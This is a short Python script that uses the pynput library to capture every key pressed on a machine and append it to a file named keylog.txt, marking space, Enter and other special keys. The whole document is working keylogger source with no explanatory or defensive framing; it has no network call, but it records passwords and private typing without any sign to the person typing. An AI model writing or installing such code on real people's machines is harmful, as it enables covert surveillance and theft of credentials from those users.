from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            # Print normal characters (letters, numbers, symbols) on a new line
            f.write(f"{key.char}\n")
        except AttributeError:
            # Handle special keys like Enter, Space, Shift, etc.
            if key == key.space:
                f.write("[SPACE]\n")  # Make spaces visible
            elif key == key.enter:
                f.write("\n")  # New line for Enter key
            else:
                f.write(f"[{key}]\n")  # Log special keys

with Listener(on_press=on_press) as listener:
    listener.join()
